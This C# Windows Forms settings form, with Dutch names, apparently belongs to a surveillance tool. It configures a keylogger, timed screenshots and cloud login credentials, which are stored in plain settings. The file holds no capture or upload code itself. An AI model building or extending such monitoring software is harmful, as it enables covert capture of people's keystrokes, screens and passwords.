using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using intercontinental_missile;

namespace aanpassen
{
    public partial class settings : Form
    {

        public settings()
        {
            InitializeComponent();
            textBox_cloud_wachtwoord.PasswordChar = '*';
        }

        #region form load

        private void Form1_Load(object sender, EventArgs e)
        {

            #region keylogger    

            #region keylogger hotkey combobox

            string[] ComboBox_sneltoets = intercontinental_missile.Properties.Settings.Default.ComboBox_sneltoets.Split(',');
            ComboBox_sneltoets_keylogger.Items.AddRange(ComboBox_sneltoets);
            ComboBox_sneltoets_keylogger.Text = intercontinental_missile.Properties.Settings.Default.sneltoets;

            #endregion

            #region keylogger taal combobox

            string[] combobox_taal = intercontinental_missile.Properties.Settings.Default.ComboBox_taal.Split(',');
            ComboBox_taal_keylogger.Items.AddRange(combobox_taal);

            ComboBox_taal_keylogger.Text = intercontinental_missile.Properties.Settings.Default.ComboBox_taal;

            #endregion

            #region activeer keylogger

            CheckBox_activeer_keylogger.Checked = intercontinental_missile.Properties.Settings.Default.activeerkeyloger;

            #endregion

            #region keylog locatie

            textBox_keylog_locatie.Text = intercontinental_missile.Properties.Settings.Default.keyloggerlocatie;

            #endregion

            #endregion

            #region screenshots

            // screenshot tijd 
            numericUpDown_seconde_screenshots.Value = intercontinental_missile.Properties.Settings.Default.seconde; 
            numericUpDown_minuten_screenshots.Value = intercontinental_missile.Properties.Settings.Default.minuten;

            // screenshot aan of uit
            checkBox_visualtoezicht_screenshots.Checked = intercontinental_missile.Properties.Settings.Default.visual_toezicht;

            // screenshot locatie
            textBox_screenshots_locatie.Text = intercontinental_missile.Properties.Settings.Default.screenshotlocatie;

            #endregion

            #region cloud

            textBox_cloud_email.Text = intercontinental_missile.Properties.Settings.Default.cloud_email;
            textBox_cloud_wachtwoord.Text = intercontinental_missile.Properties.Settings.Default.cloud_wachtwoord;

            #endregion

        }

        #endregion

        #region keylogger

        private void Buttonkeyloggertoepasing_Click(object sender, EventArgs e)
        {
            //taal
            intercontinental_missile.Properties.Settings.Default.taal = ComboBox_taal_keylogger.Text;

            //Activeer Keyloger
            intercontinental_missile.Properties.Settings.Default.activeerkeyloger = CheckBox_activeer_keylogger.Checked;

            // Keylogger Locatie
            intercontinental_missile.Properties.Settings.Default.keyloggerlocatie = textBox_keylog_locatie.Text;

            // Hotkey
            intercontinental_missile.Properties.Settings.Default.sneltoets = ComboBox_sneltoets_keylogger.Text;

            //Save Settings
            Properties.Settings.Default.Save();
        }
        

        private void Button_Browser_keyloger_Click(object sender, EventArgs e)
        {
            folderBrowserDialog_keylog.ShowDialog();
            intercontinental_missile.Properties.Settings.Default.keyloggerlocatie = folderBrowserDialog_keylog.SelectedPath;
            textBox_keylog_locatie.Text = intercontinental_missile.Properties.Settings.Default.keyloggerlocatie;

        }

        #endregion

        #region screenshots

        private void Button_toepassen_screenshots_Click(object sender, EventArgs e)
        {
            #region tijd

            intercontinental_missile.Properties.Settings.Default.minuten = numericUpDown_minuten_screenshots.Value;
            intercontinental_missile.Properties.Settings.Default.seconde = numericUpDown_seconde_screenshots.Value;
            #endregion

            // visual toezicht
            intercontinental_missile.Properties.Settings.Default.visual_toezicht = checkBox_visualtoezicht_screenshots.Checked;

            //screenshot locatie
            intercontinental_missile.Properties.Settings.Default.screenshotlocatie = textBox_screenshots_locatie.Text;


            intercontinental_missile.Properties.Settings.Default.Save();
        }

        private void Button_browser_screenshots_Click(object sender, EventArgs e)
        {
            folderBrowserDialog_screenshots.ShowDialog();
            intercontinental_missile.Properties.Settings.Default.screenshotlocatie = folderBrowserDialog_screenshots.SelectedPath;
            textBox_screenshots_locatie.Text = intercontinental_missile.Properties.Settings.Default.screenshotlocatie;

        }

        #endregion

        #region cloud

        private void Button_cloud_toepassen_Click(object sender, EventArgs e)
        {
            intercontinental_missile.Properties.Settings.Default.cloud_email = textBox_cloud_email.Text;
            intercontinental_missile.Properties.Settings.Default.cloud_wachtwoord = textBox_cloud_wachtwoord.Text;

            intercontinental_missile.Properties.Settings.Default.Save();
        }


        #endregion

        private void Button1_Click(object sender, EventArgs e)
        {
            
        }
    }
}
